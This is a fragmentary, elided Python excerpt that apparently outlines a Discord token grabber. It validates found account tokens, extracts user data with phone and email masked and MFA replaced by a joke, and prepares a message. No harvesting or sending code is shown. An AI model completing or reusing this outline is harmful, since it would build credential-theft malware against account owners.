...
class token2Discord:
    ...
    def extract(self, userData, token):
        ...
        phone = "*" * len(userData['phone'])
        email = "*" * len(userData['email'])

        mfa = "Wouldn't you like to know, weather boy?"

        return username, phone, email, mfa
...
def main():
    ...
    # if tokens were found, validate all tokens
        for token in tokens:
            ...
            if userData != None:
                 username, phone, email, mfa = grab.extract(userData, token)
                 # construct message
                 os.system('cls')
